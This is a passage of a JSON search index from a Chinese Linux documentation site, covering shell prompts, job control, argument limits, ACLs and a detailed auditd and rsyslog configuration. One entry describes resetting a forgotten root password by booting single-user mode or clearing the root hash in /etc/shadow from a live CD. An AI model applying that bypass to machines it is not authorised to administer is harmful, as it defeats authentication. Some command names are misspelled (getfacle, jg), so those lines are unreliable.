u","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shortcut-key.html","loc":"/yq-docs-operating-system-linux-Tutorial-shortcut-key.html"},{"title":"PS1 提示符定义","text":"参考: linux PS1 提示符定义 PS1 就是用户平时的提示符。 PS2 第一行没输完，等待第二行输入的提示符。 Linux系统提示符是用系统变量PS1来定义的。\n一般系统默认的形式是：[ username@host 工作目录]$. 用 echo $PS1 可以得到PS1的值，即: PS1=\"[\\u@\\h \\w]\"\\$ 登录后可以更改PS1的显示样式，但是当退出重启登录进入系统后，\n样式又变成系统默认的样式了，如果要彻底改变它的样式，只能从配置文件中改。 PS是在用户根目录下的.bash_profile中定义的。 如: # .bash_profile\n\n# Get the aliases and functions\n\nif [ -f ~/.bashrc ]; then\n\n. ~/.bashrc\n\nfi\n\n# User specific environment and startup programs 以下是设定的PS1的值: PS1=\"[\\u@\\h \\w]\\$\"\n\nPATH=$PATH:$HOME/bin 使用export把PS1输出，以使它可以在子shell中生效,这会造成ROOT用户的也采用此样式,\nexport PS1 要慎用: export PATH\n\nunset USERNAME 下面简单说说环境下默认的特殊符号所代表的意义: \\d: 代表日期，格式为weekday month date，例如：\"Mon Aug 1\"\n\\H: 完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux\n\\h: 仅取主机的第一个名字，如上例，则为fc4，.linux则被省略\n\\t: 显示时间为24小时格式，如：HH：MM：SS\n\\T: 显示时间为12小时格式\n\\A: 显示时间为24小时格式：HH：MM\n\\u: 当前用户的账号名称\n\\v: BASH的版本信息\n\\w: 完整的工作目录名称。家目录会以 ~代替\n\\W: 利用basename取得工作目录名称，所以只会列出最后一个目录\n\\#: 下达的第几个命令\n\\$: 提示字符，如果是root时，提示符为：# ，普通用户则为：$ 我们可以通过设置PS1变量使提示符成为彩色。\n在PS1中设置字符序列颜色的格式为: \\[\\e[F;Bm\\]\n# 其实 \\e[Fm 即可\n\n# 其中 F 为字体颜色，编号30~37； B 为背景色，编号40~47。\n# 可通过 \\e[0m 关闭颜色输出；特别的，当B为1时，将显示加亮加粗的文字， 颜色表与代码表见 颜色表与代码表","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-PS1-prompt-definition.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-PS1-prompt-definition.html"},{"title":"套接字","text":"套接字被广泛应用于所有的互联网通信，数据库和操作系统本身。 它类似于命名管道（FIFO）并且允许进程之间甚至不同计算机之间进行信息交换。 对于套接字，这些进程不需要在同一时间运行，也不需要是同一个父进程的子进程。 它是 进程间通信（IPC） 的一个节点。信息的交换可能会通过网络发生在不同主机之间。 最常见的两种是 互联网套接字 和 UNIX域套接字 通过 \"`netstat -an`\" 命令可以很方便的查看系统已经打开了哪些套接字","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Puzzle.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Puzzle.html"},{"title":"记录 shell 活动","text":"shell 命令的输出有可能滚动出了屏幕，\n并可能导致你无法再查看到它。\n将shell活动记录到文件中再来回顾它是个不错的主意。\n当你执行任何系统管理任务时，这种记录是必不可少的。 运行 shell。尝试下列例子: $ script Script started, file is typescript 在 script 下使用任何 shell 命令。\n按 Ctrl-D 来退出 script $ vim typescript","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Record-shell-activity.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Record-shell-activity.html"},{"title":"熵","text":"Linux内核采用熵来描述数据的随机性。\n熵（entropy）是描述系统混乱无序程度的物理量，\n一个系统的熵越大则说明该系统的有序性越差，即不确定性越大。\n在信息学中，熵被用来表征一个符号或系统的不确定性，熵越大，表明系统所含有用信息量越少，不确定度越大。 计算机本身是可预测的系统，因此，用 计算机算法 不可能产生真正的随机数。但是机器的环境中充满了各种各样的噪声，\n如硬件设备发生中断的时间，用户点击鼠标的时间间隔等是完全随机的，\n事先无法预测。\nLinux内核实现的随机数产生器正是利用系统中的这些随机噪声来产生高质量随机数序列。 内核维护了一个熵池用来收集来自 设备驱动程序 和其它来源的环境噪音。\n理论上，熵池中的数据是完全随机的，可以实现产生真随机数序列。\n为跟踪熵池中数据的随机性，内核在将数据加入池的时候将估算数据的随机性，\n这个过程称作熵估算。熵估算值描述池中包含的随机数位数，其值越大表示池中数据的随机性越好。","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-entropy.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-entropy.html"},{"title":"随机数","text":"/dev/random和/dev/urandom其实效果都是一样的 man描述的不是很准确 详细见: https://zhuanlan.zhihu.com/p/64680713 真伪随机是存在的: https://blog.csdn.net/czc1997/article/details/78167705 但是linux的/dev/random和/dev/urandom与真伪并不完全一致","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-random-number.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-random-number.html"},{"title":"二进制数据访问","text":"最基础的查看二进制数据的方法是使用 od -t x1 命令。 参考 od","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Dual--proof-data-access.html","loc":"/yq-docs-operating-system-linux-question-Dual--proof-data-access.html"},{"title":"获取所有变量与环境变量","text":"环境变量 env或export 所有变量 set 注解 变量不能以数字开头 若 A=B 且 B=C，若我下达 unset $A，则取消的是什么？ 取消的是B，因为 unset $A 相当于 unsetB 所以取消的是B，A会继续存在","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Get-all-variables-and-environment-variables.html","loc":"/yq-docs-operating-system-linux-question-Get-all-variables-and-environment-variables.html"},{"title":"linux参数过长","text":"关于linux参数过长问题， 查看参数可以使用: xargs --show-limits 其中会有一个这个: Size of command buffer we are actually using: 131072 表示命令行单个参数长度不能超过 131072 实际测试 最大只能到 131071: /bin/echo `python -c \"print '.'*131071\"` 一些文章参考:: python – 为什么subprocess.Popen参数长度限制... Linux command line character limit 【Linux】【编译相关】execvp: /bin/sh: Argument list too long问题处理小结 What defines the maximum size for a command single argument? Unix / Linux: Maximum Character Length of Arguments In a Shell Command","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-LINUX-parameter-is-too-long.html","loc":"/yq-docs-operating-system-linux-question-LINUX-parameter-is-too-long.html"},{"title":"进程暂停与挂起","text":"在macos上验证 ctrl + z 暂停进程 恢复 jobs 查看有哪些进程被暂停 bg %N 使第N个任务在后台运行（%前有空格） fg %N 使第N个任务在前台运行 jg %n 挂起被暂停的进程，n为进程序号 注解 默认bg，fg不带%N时表示对最后一个进程操作！ 相关指令: jobs bg 转后台执行 fg 恢复执行","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Process-pause-and-hanging.html","loc":"/yq-docs-operating-system-linux-question-Process-pause-and-hanging.html"},{"title":"root密码忘记","text":"查看 /etc/shadow 使用的加密机制: authconfig --test | grep hashing 方法一 重启进入单人维护模式，系统会主动给予 root 权限的 bash 接口， 然后 passwd 修改 方法二 以 Live CD 开机后挂载根目录去修改 /etc/shadow，将里面的 root 密码字段清空 方法三 如果普通用户有sudo的passwd权限，那么直接 sudo passwd即可","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Root-password-forgotten.html","loc":"/yq-docs-operating-system-linux-question-Root-password-forgotten.html"},{"title":"单次任务","text":"即一次性任务 运行 at 命令来安排一次性的工作: $ echo 'command -args'| at 3:40 monday","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Single-task.html","loc":"/yq-docs-operating-system-linux-question-Single-task.html"},{"title":"Linux的一些内核参数","text":"问题背景: execvp: /bin/sh: Argument list too long 问题出现的两种情况： make的时候，如编译Linux内核、驱动、Android版本等较长-I、-D选项的情况； shell操作，涉及较多文件的情况，如删除大量文件时，直接用rm； 问题原因 错误来源于sysdeps/gnu/errlist.c文件中: [ERR_REMAP (E2BIG)] = N_(\"Argument list too long\"), 可据此找到对应Linux内核中exec.c中返回E2BIG的地方，实际和ARG_MAX有很大关系。 参考APUE，ARG_MAX的值在运行时间不变的值，但值可能不确定。\nARG_MAX的值实际上和下面参数有关系 MAX_ARG_STRLEN #单个字符串的最大大小 MAX_ARG_STRINGS #参数个数的限制 MAX_ARG_PAGES #分配给参数的最大页数 stack size #堆栈空间 ARG_MAX in limits.h #参数的最大长度 实际上，不同内核的版本也有区别。 几个命令执行情况的例子: [qxhgd@localhost]getconf ARG_MAX\n2897152\n[qxhgd@localhost]ulimit -s\n8192\n[qxhgd@localhost]xargs --show-limits\nYour environment variables take up 4222 bytes\nPOSIX upper limit on argument length (this system): 2090882\nPOSIX smallest allowable upper limit on argument length (all systems): 4096\nMaximum length of command we could actually use: 2086660\nSize of command buffer we are actually using: 131072 参考: https://blog.csdn.net/qxhgd/article/details/115472297","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Some-kernel-parameters-of-Linux.html","loc":"/yq-docs-operating-system-linux-question-Some-kernel-parameters-of-Linux.html"},{"title":"谁在系统","text":"你可以通过下面的方法检查谁登录在系统里。 who 显示谁登录在系统里面。 w 显示谁登录在系统里面，他们正在在做什么。 last 显示用户最后登录的列表。 lastb 显示用户最后错误登录的列表。","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Who-is-in-the-system.html","loc":"/yq-docs-operating-system-linux-question-Who-is-in-the-system.html"},{"title":"ACL权限控制","text":"查看acl权限: getfacle $filename 参考: getfacle 设置acl权限: setfacle 选项 文件名 参考: setfacle 参考地址: http://c.biancheng.net/view/863.html","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-ACL-permission-control.html","loc":"/yq-docs-operating-system-linux-system-service-ACL-permission-control.html"},{"title":"auditd-系统审计","text":"auditd The Linux Audit Subsystem is a system to Collect information regarding events occurring on the system(s) ,\nKernel events (syscall events), User events (audit-enabled programs) syslog记录的信息有限，主要目的是软件调试，跟踪和打印软件的运行状态，而audit的目的则不同，\n它是linux安全体系的重要组成部分，是一种\"被动\"的防御体系。\n在内核里有内核审计模块，记录系统中的各种动作和事件，比如系统调用，文件修改，执行的程序，\n系统登入登出和记录所有系统中所有的事件，它的主要目的是方便管理员根据日记审计系统是否允许有异常，\n是否有入侵等等，说穿了就是把和系统安全有关的事件记录下来。 auditd 是Linux审计系统的用户空间组件，它负责将审计记录写入磁盘。 查看日志使用 ausearch 或 aureport 实用程序完成。 使用 auditctl 实用程序配置审核系统或加载规则。 在 auditd 启动期间， /etc/audit/audit.rules 中的审计规则由 auditctl 读取并加载到内核中。 或者还有一个 augenrules 程序，读取 /etc/audit/rules.d/ 中的规则并将其编译成 audit.rules 审计规则文件中。 审计守护进程本身 有一些配置选项可以让管理员进行自定义配置 audit可以用来干什么 Watching file access Monitoring system calls Recording commands run by a user Recording security events Monitoring network access 怎么开启audit 首先内核需要打开 CONFIG_AUDIT 的配置，在打开了配置重新编译内核后，\naudit功能默认是关闭的，有两种方法在使能audit: cmdline中加入audit= 1参数，如果这个参数设置为1，而且auditd没有运行，则审计日志会被写到/var/log/messages中。 使用守护进程auditd 详见 https://blog.csdn.net/whuzm08/article/details/87267956 auditd相关工具与配置文件 auditctl 即时控制审计守护进程的行为的工具，比如如添加规则等等 aureport 查看和生成审计报告的工具 ausearch 查找审计事件的工具 auditspd 转发事件通知给其他应用程序，而不是写入到审计日志文件中 autrace 一个用于跟踪进程的命令 /etc/audit/auditd.conf auditd工具的配置文件 /etc/audit/rules.d/audit.rules 包含审核规则的文件 /etc/audit/audit.rules 记录审计规则的文件 配置字段的含义 type=SYSCALL 每条记录都是以type=\"keyword\"开头，\nSYSCALL表示这条记录是向内核的系统调用触发产生的。\n更详细的type值和解释可以参考: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-Audit_Record_Types msg=audit(1523501777.709:4172989316) 在audit(time_stamp:ID)格式中，记录时间戳，从1970年1月1日00:00:00到现在的时间，\nID为记录中唯一的ID标识，同一个事件产生的ID是相同的，\n如上访问audit_test目录会触发产生三条日志，但是事件ID是相同的。 arch=c000003e 表示系统的CPU架构，这个十六进制表示\"x86_64\"，\n使用命令 ausearch -i --arch c000003e 可以打印出有这部分内容的audit.log中日志的解释。\n需要注意的是，使用ausearch来查询时，需要保证audit log中有这样的日志记录。 syscall=257 向内核的系统调用的类型，类型值为257，在/usr/include/asm/unistd_64.h中有定义，\n这里257表示openat，可以使用命令ausyscall来查询不同的数字对应的系统调用名称。\n或者使用 ausyscall --dump 命令来显示所有的系统调用: # ausyscall 257\nopenat\n# ausyscall --dump\nUsing x86_64 syscall table:\n0 read\n1 write\n2 open success=yes 表示系统调用成功与否 exit=3 系统调用结束时的返回码，可以使用如下命令来查看返回值为3的日志解释，不同的系统调用，返回值不同: #ausearch --interpret --exit 3 a0=ffffffffffffff9c a1=21e0550 a2=90800 a3=0 为系统调用时的前四个arguments，这些arguments依赖于使用的系统调用，可以使用ausearch来查看解释（部分参数可以打印出数值具体的解释）。 items=1 表示跟在系统调用后，补充记录的个数。 ppid=2354 父进程ID，如bash的ID。 pid=30729 进程Id，即为ls进程的ID。我们通过ps来查询，可以看到bash的进程与ppid是对应的: linux-xdYUnA:/home/audit_test # ps -aux | grep bash\nlbh       2354  0.0  0.0 115376  2100 pts/1    S+   Apr11   0:00 bash\nroot     12478  0.0  0.0 115888  2608 pts/0    Ss   Apr11   0:00 -bash\nroot     13329  0.1  0.0 115888  2612 pts/2    Ss   11:15   0:00 -bash\nroot     15531  0.0  0.0 112652   972 pts/2    S+   11:15   0:00 grep --color=auto bash\nroot     30707  0.0  0.0 115888  2632 pts/1    Ss   Apr11   0:00 -bash 关于/etc/audit/auditd.conf的配置 log_file =/var/log/audit/audit.log 审计日志文件的完整路径。 如果您配置守护进程向除默认/var/log/audit/外的目录中写日志文件时，\n一定要修改它上面的文件权限,\n使得只有根用户有读、写和执行权限 所有其他用户都不能访问这个目录或这个目录中的日志文件。                                                                                                                                                                                                                                                                                 | log_format = RAW 写日志时要使用的格式。 当设置为RAW时，数据会以从内核中检索到的格式写到日志文件中。 当设置为NOLOG时，数据不会写到日志文件中，\n但是如果用dispatcher选项指定了一个，则数据仍然会发送到审计事件调度程序中                                                                                                                                                                                                                                                                                     | log_group = root 日志所属组                                                                                                                                                                                                                                                                                                                                                                                                         | priority_boost = 4 审计应采用多少优先级推进守护进程。必须是非负数。0表示没有变化                                                                                                                                                                                                                                                                                                                                                                               | flush = INCREMENTAL 多长时间向日志文件中写一次数据。值可以是NONE、INCREMENTAL、DATA和SYNC之一。 如果设置为NONE，则不需要做特殊努力来将数据 刷新到日志文件中。 如果设置为INCREMENTAL，则用freq选项的值确定多长时间发生一次向磁盘的刷新。 如果设置为DATA，则审计数据和日志文件一直是同步的。 如果设置为SYNC，则每次写到日志文件时，数据和元数据是同步的。                                                                                                                                                                                                 | freq = 20 如果flush设置为INCREMETNAL，审计守护进程在写到日志文件中前从内核中接收的记录数                                                                                                                                                                                                                                                                                                                                                               | num_logs = 5 max_log_file_action设置为ROTATE时要保存的日志文件数目。必须是0~99之间的数。 如果设置为小于2，则不会循环日志。 如果递增了日志文件的数目，就可能有必要递增/etc/audit/audit.rules中的内核backlog设置值，\n以便留出日志循环的时间。 如果没有设 置num_logs值，它就默认为0，意味着从来不循环日志文件。 当达到指定文件容量后会循环日志文件，但是只会保存一定数目的老文件，这个数目由num_logs参数指定。 老文件的文件名将为audit.log.N，其中 N是一个数字。这个数字越大，则文件越老。                                                                                                 | disp_qos = lossy 控制调度程序与审计守护进程之间的通信类型。有效值为lossy和lossless。 如果设置为lossy，若审计守护进程与调度程序之间的缓冲区已满 (缓冲区为128千字节)，\n则发送给调度程序的引入事件会被丢弃。然而，只要log_format没有设置为nolog，事件就仍然会写到磁盘中。 如果设 置为lossless，则在向调度程序发送事件之前和将日志写到磁盘之前，调度程序会等待缓冲区有足够的空间。                                                                                                                                                                                          | dispatcher = /sbin/audispd 当启动这个守护进程时，由审计守护进程自动启动程序。所有守护进程都传递给这个程序。 可以用它来进一步定制报表或者以与您的自定义分析程序兼容的不同格式 产生它们。\n自定义程序的示例代码可以在/usr/share/doc/audit- /skeleton.c中找到。\n由于调度程序用根用户特权运行，因此使用这个选项时要极其小心。这个选项不是必需的。                                                                                                                                                                                                                       | name_format = NONE 格式: ##name = mydomain 此选项控制计算机节点名如何插入到审计事件流中。\n它有如下的选择：none,  hostname, fqd, numeric, and user None意味着没有计算机名被插入到审计事件中。 hostname通过gethostname系统调用返回的名称。 fqd意味着它=以主机名和解决它与DNS的完全合格的域名， numeric类似于fqd除解决本机的IP地址，为了使用这个选项，\n你可能想要测试'hostname -i'或 'domainname-i'返回一个数字地址,\n另外，此选项不如果DHCP的使用是因为你可以有不同的地址，在同一台机器上的时间推荐。\n用户是从名称选项中定义的字符串。默认值是没有                                                                    | max_log_file = 6 以兆字节表示的最大日志文件容量。当达到这个容量时，会执行max_log_file _action指定的动作                                                                                                                                                                                                                                                                                                                                                         | max_log_file_action = ROTATE 当达到max_log_file的日志文件大小时采取的动作。\n值必须是IGNORE、SYSLOG、SUSPEND、ROTATE和KEEP_LOGS之 一。 如果设置为IGNORE，则在日志文件达到max_log_file后不采取动作。 如果设置为SYSLOG，则当达到文件容量时会向系统日志/var /log/messages中写入一条警告。 如果设置为SUSPEND，则当达到文件容量后不会向日志文件写入审计消息。 如果设置为ROTATE，则当达 到指定文件容量后会循环日志文件，但是只会保存一定数目的老文件，\n这个数目由num_logs参数指定。老文件的文件名将为audit.log.N，其中 N是一个数字。这个数字越大，则文件越老。 如果设置为KEEP_LOGS，则会循环日志文件，但是会忽略num_logs参数，因此不会删除日志文件 space_left = 75 以兆字节表示的磁盘空间数量。\n当达到这个水平时，会采取space_left_action参数中的动作                                                                                                                                                                                                                                                                                                                                                        | space_left_action = SYSLOG 当磁盘空间量达到space_left中的值时，采取这个动作。\n有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和 HALT。 如果设置为IGNORE，则不采取动作。 如果设置为SYSLOG，则向系统日志/var/log/messages写一条警告消息。 如果设置为EMAIL，则从action_mail_acct向这个地址发送一封电子邮件，并向/var/log/messages中写一条警告消息。 如果设置为 SUSPEND，则不再向审计日志文件中写警告消息。 如果设置为SINGLE，则系统将在单用户模式下。 如果设置为SALT，则系统会关闭                                                                                   | action_mail_acct = root 负责维护审计守护进程和日志的管理员的电子邮件地址。\n如果地址没有主机名，则假定主机名为本地地址，比如root。\n必须安装sendmail并配置为向指定电子邮件地址发送电子邮件                                                                                                                                                                                                                                                                                                                    | admin_space_left = 50 以兆字节表示的磁盘空间数量。\n用这个选项设置比space_left_action更多的主动性动作，\n以防万一space_left_action没有让管理员释放任何磁盘空间。\n这个值应小于space_left_action。\n如果达到这个水平，则会采取 admin_space_left_action 所指定的动作                                                                                                                                                                                                                                        | admin_space_left_action = SUSPEND 当自由磁盘空间量达到admin_space_left指定的值时，则采取动作。\n有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和HALT。\n与这些值关联的动作与 space_left_action 中的相同。                                                                                                                                                                                                                                                                                  | disk_full_action = SUSPEND 如果含有这个审计文件的分区已满，则采取这个动作。\n可能值为IGNORE、SYSLOG、SUSPEND、SINGLE和HALT。与这些值关联的动作与 space_left_action 中的相同。                                                                                                                                                                                                                                                                                                      | disk_error_action = SUSPEND 如果在写审计日志或循环日志文件时检测到错误时采取的动作。\n值必须是IGNORE、SYSLOG、SUSPEND、SINGLE和HALT之一。\n与这些值关的动作与space_left_action中的相同                                                                                                                                                                                                                                                                                                  | tcp_listen_port = 这是在范围1、65535，一个数字值，如果指定，原因auditd听在从远程系统审计记录相应的TCP端口。\n审计程序可能与tcp_wrappers。\n你可能想控制在hosts.allow入口访问和否认文件。                                                                                                                                                                                                                                                                                                | tcp_listen_queue = 5 这是一个数字值，这表明有多少等待（要求但UNAC接受）的连接是允许的。\n默认值是5。设置过小的可能导致连接被拒绝，如果太多主机开始在完全相同的时间，如电源故障后。                                                                                                                                                                                                                                                                                                                         | tcp_max_per_addr = 1 格式: tcp_client_ports = 1024-65535\ntcp_client_max_idle = 0 这是一个数字值，该值表示一个地址允许有多少个并发连接。\n默认为1，最大为1024。\n设置过大可能会允许拒绝服务攻击的日志服务器。\n还要注意的是，内核内部有一个最大的，最终将防止这种即使auditd允许它通过配置。\n在大多数情况下，默认应该是足够除非写一个自定义的恢复脚本运行提出未发送事件。\n在这种情况下，您将增加的数量只有足够大，让它在过。                                                                                                                                                                                                                    | enable_krb5 = no 如果设置为\"yes\"，Kerberos 5将用于认证和加密。默认是\"no\"。                                                                                                                                                                                                                                                                                                                                                                        | krb5_principal = auditd 这是这个服务器的主要。\n默认是\"auditd\"。鉴于这种默认情况下，服务器会寻找一个名为`auditd/ hostname@EXAMPLE .COM`存储在/etc/audit/audit.key.\n认证本身其中主机是服务器的主机名称，如DNS查找其IP地址返回。                                                                                                                                                                                                                                                                     | krb5_key_file = /etc/audit/audit.key 这个客户的主要负责人的位置。请注意，密钥文件必须由根和模式0400所拥有。默认的是/etc/audit/audit.key                                                                                                                                                                                                                                                                                                                                                 | 注解 auditd当max_action设置为rotate时，日志分隔具有延时性，且后缀数字最大的是最旧的log文件 研究audit日志规则，本文为进程配置: # 审计日志文件的完整路径。如果您配置守护进程向除默认/var/log/audit/外的目录中写日志文件时，\n# 一定要修改它上面的文件权限，使得只有根用户有读、写和执行权限。所有其他用户都不能访问这个\n# 目录或这个目录中的日志文件。\nlog_file =/var/log/audit/audit.log\n\n# 写日志时要使用的格式。当设置为RAW时，数据会以从内核中检索到的格式写到日志文件中。当设置\n# 为NOLOG时，数据不会写到日志文件中，但是如果用dispatcher选项指定了一个，则数据仍然会发送\n# 到审计事件调度程序中\nlog_format = RAW\n\n# 日志所属组\nlog_group = root\n\n# 审计应采用多少优先级推进守护进程。必须是非负数。0表示没有变化。\npriority_boost = 4\n\n# 多长时间向日志文件中写一次数据。值可以是NONE、INCREMENTAL、DATA和SYNC之一。如果设置为\n# NONE，则不需要做特殊努力来将数据 刷新到日志文件中。如果设置为INCREMENTAL，则用freq选项\n# 的值确定多长时间发生一次向磁盘的刷新。如果设置为DATA，则审计数据和日志文件一直是同步的。\n# 如果设置为SYNC，则每次写到日志文件时，数据和元数据是同步的。\nflush = INCREMENTAL\n\n# 如果flush设置为INCREMETNAL，审计守护进程在写到日志文件中前从内核中接收的记录数\nfreq = 20\n\n#max_log_file_action设置为ROTATE时要保存的日志文件数目。必须是0~99之间的数。如果设置为小于2，\n# 则不会循环日志。如果递 增了日志文件的数目，就可能有必要递增/etc/audit/audit.rules中的内核\n# backlog设置值，以便留出日志循环的时间。如果没有设 置num_logs值，它就默认为0，意味着从来不循环日志文件。\nnum_logs = 5\n\n# 控制调度程序与审计守护进程之间的通信类型。有效值为lossy和lossless。如果设置为lossy，\n# 若审计守护进程与调度程序之间的缓冲区已满 (缓冲区为128千字节)，则发送给调度程序的引入\n# 事件会被丢弃。然而，只要log_format没有设置为nolog，事件就仍然会写到磁盘中。如果设 置为lossless，\n# 则在向调度程序发送事件之前和将日志写到磁盘之前，调度程序会等待缓冲区有足够的空间。\ndisp_qos = lossy\n\n# 当启动这个守护进程时，由审计守护进程自动启动程序。所有守护进程都传递给这个程序。可以用\n# 它来进一步定制报表或者以与您的自定义分析程序兼容的不同格式 产生它们。自定义程序的示例\n# 代码可以在/usr/share/doc/audit- /skeleton.c中找到。由于调度程序用根用户特权运行，因此使用\n# 这个选项时要极其小心。这个选项不是必需的。\ndispatcher = /sbin/audispd\n\n# 此选项控制计算机节点名如何插入到审计事件流中。它有如下的选择：none,  hostname, fqd, numeric, and user\n# None意味着没有计算机名被插入到审计事件中。hostname通过gethostname系统调用返回的名称。fqd意味着它=以主机名\n# 和解决它与DNS的完全合格的域名，numeric类似于fqd除解决本机的IP地址，为了使用这个选项，你可能想要测试'hostname -i'\n# 或 'domainname-i'返回一个数字地址,另外，此选项不如果DHCP的使用是因为你可以有不同的地址，在同一台机器上的时间推荐。\n# 用户是从名称选项中定义的字符串。默认值是没有\nname_format = NONE\n\n##name = mydomain\n# 以兆字节表示的最大日志文件容量。当达到这个容量时，会执行max_log_file _action指定的动作\nmax_log_file = 6\n\n# 当达到max_log_file的日志文件大小时采取的动作。值必须是IGNORE、SYSLOG、SUSPEND、ROTATE和KEEP_LOGS之 一。\n# 如果设置为IGNORE，则在日志文件达到max_log_file后不采取动作。如果设置为SYSLOG，则当达到文件容量时会向\n# 系统日志/var /log/messages中写入一条警告。如果设置为SUSPEND，则当达到文件容量后不会向日志文件写入审计\n# 消息。如果设置为ROTATE，则当达 到指定文件容量后会循环日志文件，但是只会保存一定数目的老文件，这个数目\n# 由num_logs参数指定。老文件的文件名将为audit.log.N，其中 N是一个数字。这个数字越大，则文件越老。如果设\n# 置为KEEP_LOGS，则会循环日志文件，但是会忽略num_logs参数，因此不会删除日志文件\nmax_log_file_action = ROTATE\n\n# 以兆字节表示的磁盘空间数量。当达到这个水平时，会采取space_left_action参数中的动作\nspace_left = 75\n\n# 当磁盘空间量达到space_left中的值时，采取这个动作。有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和 HALT。\n# 如果设置为IGNORE，则不采取动作。如果设置为SYSLOG，则向系统日志/var/log/messages写一条警告消息。如果设置为\n# EMAIL，则从action_mail_acct向这个地址发送一封电子邮件，并向/var/log/messages中写一条警告消息。如果设置为\n# SUSPEND，则不再向审计日志文件中写警告消息。如果设置为SINGLE，则系统将在单用户模式下。如果设置为SALT，则系统会关闭。\nspace_left_action = SYSLOG\n\n# 负责维护审计守护进程和日志的管理员的电子邮件地址。如果地址没有主机名，则假定主机名为本地地址，比如root。\n# 必须安装sendmail并配置为向指定电子邮件地址发送电子邮件。\naction_mail_acct = root\n\n# 以兆字节表示的磁盘空间数量。用这个选项设置比space_left_action更多的主动性动作，以防万一space_left_action没有让\n# 管理员释放任何磁盘空间。这个值应小于space_left_action。如果达到这个水平，则会采取admin_space_left_ action所指定的动作。\nadmin_space_left = 50\n\n# 当自由磁盘空间量达到admin_space_left指定的值时，则采取动作。有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和HALT。\n# 与这些值关联的动作与space_left_action中的相同。\nadmin_space_left_action = SUSPEND\n\n# 如果含有这个审计文件的分区已满，则采取这个动作。可能值为IGNORE、SYSLOG、SUSPEND、SINGLE和HALT。与这些值关联的动作\n# 与space_left_action中的相同。\ndisk_full_action = SUSPEND\n\n# 如果在写审计日志或循环日志文件时检测到错误时采取的动作。值必须是IGNORE、SYSLOG、SUSPEND、SINGLE和HALT之一。\n# 与这些值关的动作与space_left_action中的相同\ndisk_error_action = SUSPEND\n\n# 这是在范围1、65535，一个数字值，如果指定，原因auditd听在从远程系统审计记录相应的TCP端口。审计程序可能与tcp_wrappers。\n# 你可能想控制在hosts.allow入口访问和否认文件。\ntcp_listen_port =\n\n# 这是一个数字值，这表明有多少等待（要求但UNAC接受）的连接是允许的。默认值是5。设置过小的可能导致连接被拒绝，\n# 如果太多主机开始在完全相同的时间，如电源故障后。\ntcp_listen_queue = 5\n\n# 这是一个数字值，该值表示一个地址允许有多少个并发连接。默认为1，最大为1024。设置过大可能会允许拒绝服务攻击的日志服务器。\n# 还要注意的是，内核内部有一个最大的，最终将防止这种即使auditd允许它通过配置。在大多数情况下，默认应该是足够除非写一个\n# 自定义的恢复脚本运行提出未发送事件。在这种情况下，您将增加的数量只有足够大，让它在过。\ntcp_max_per_addr = 1\n##tcp_client_ports = 1024-65535\ntcp_client_max_idle = 0\n\n# 如果设置为\"yes\"，Kerberos 5将用于认证和加密。默认是\"no\"。\nenable_krb5 = no\n\n# 这是这个服务器的主要。默认是\"auditd\"。鉴于这种默认情况下，服务器会寻找一个名为auditd/hostname@EXAMPLE.COM存储在/etc/audit/audit.key\n# 认证本身其中主机是服务器的主机名称，如DNS查找其IP地址返回。\nkrb5_principal = auditd\n\n# 这个客户的主要负责人的位置。请注意，密钥文件必须由根和模式0400所拥有。默认的是/etc/audit/audit.key\nkrb5_key_file = /etc/audit/audit.key auditd的使用 安装auditd服务: # CentOS7系统默认安装了audit服务\n\nrpm -aq | grep audit\nrpm -ql audit 配置audit.rules规则 默认情况下审计规则是空的 查看规则: auditctl -l 查看命令帮助: auditctl -h 例如添加一条规则: auditctl -w /data -p rwxa\n/*监控/data目录\n-w path : 指定要监控的路径\n-p : 指定触发审计的文件/目录的访问权限\nrwxa ： 指定的触发条件，r 读取权限，w 写入权限，x 执行权限，a 属性（attr）*/ 永久保存审计规则 指令: vi /etc/audit/rules.d/audit.rules\n例如将-w /data/ -p rwxa加入到最后一行\nservice auditd restart\nauditctl -l 审计效果 在/data/目录下生成一个文件或者修改文件，查看审计日志: tail -f /var/log/audit/audit.log 将audit日志通过rsyslog转发给日志服务器 audit有rsyslog插件能实现转发到本地的rsyslog服务: cd /etc/audisp/plugins.d/\nvi syslog.conf\n修改如下两项\nactive = yes\nargs = LOG_LOCAL0\n然后重启audit服务\nservice auditd restart audit审计日志还会输出到/var/log/message文件中 如果需要禁止输出到/var/log/messages文件，可以修改rsyslog.conf配置项并重启rsyslog服务 在如下位置加入local0.none来实现不输出到/var/log/messages中: vi /etc/rsyslog.conf\n*.info;mail.none;authpriv.none;cron.none;local0.none    /var/log/messages\n最后一行添加日志服务器\n*.* @192.168.31.51\n保存退出\nservice rsyslog restart 审计日志只输出到日志服务器，未打印到/var/log/messages中 系统日志 以下介绍的是20个位于/var/log/ 目录之下的日志文件。\n其中一些只有特定版本采用，如dpkg.log只能在基于Debian的系统中看到。 /var/log/messages 包括整体系统信息，其中也包含系统启动期间的日志。\n此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。 var/log/dmesg 包含内核缓冲信息（kernel ring 